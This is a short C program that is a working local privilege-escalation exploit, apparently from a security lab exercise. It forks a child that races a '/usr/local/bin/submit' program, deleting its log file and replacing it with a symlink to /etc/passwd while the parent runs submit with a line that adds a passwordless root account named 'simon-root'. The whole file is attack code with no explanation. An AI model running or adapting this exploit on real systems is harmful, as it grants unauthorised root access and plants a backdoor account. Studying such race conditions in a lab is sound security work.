#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit"
#define PASSWORD_FILE "/etc/passwd"
#define LOG_FILE "/home/user/submit.log"
#define SUBMIT_FILE "normal_file"
#define MESSAGE "simon-root::0:0:root:/root:/bin/sh"

int main(int argc, char *argv[]) {
  int pid;
  FILE *submit_file;
  char *args[4];
  char *env[1];

  remove(LOG_FILE);

  pid = fork();
  if (pid == 0) {
    printf("Child: Process started. Waiting for creation of log file.");
    
    while (access(LOG_FILE, F_OK) == -1) {
      printf(".");
      fflush(stdout);
    }

    printf("Child: Log file exists.\n");
    remove(LOG_FILE);
    printf("Child: Log file removed.\n");

    symlink(PASSWORD_FILE, LOG_FILE);
    printf("Child: Log file symlinked to password file.\n");

  } else {
    printf("Parent: Process started.\n"); 

    // submit_file = fopen(SUBMIT_FILE, "w+");
    // fclose(submit_file);

    args[0] = TARGET;
    args[1] = SUBMIT_FILE;
    args[2] = MESSAGE;
    args[3] = NULL;

    env[0] = NULL;

    printf("Parent: Executing submit.\n");
    execve(args[0], args, env); 

  } 
  exit(0);
}
